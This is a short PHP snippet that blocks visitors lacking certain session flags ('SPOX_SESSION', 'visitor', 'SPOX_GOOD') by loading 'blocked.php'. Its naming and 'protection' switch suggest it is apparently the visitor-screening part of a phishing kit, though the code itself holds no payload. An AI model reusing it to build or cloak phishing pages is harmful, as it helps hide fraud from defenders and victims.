<?php
if (!isset($_SESSION['SPOX_SESSION'])) {
  include'blocked.php';exit();
}
if (!isset($_SESSION['visitor'])) {
  include'blocked.php';exit();
}
if ($beems_protection == "on") {
	if (!isset($_SESSION['SPOX_GOOD'])) {
 		 include'blocked.php';exit();
    }
}

?>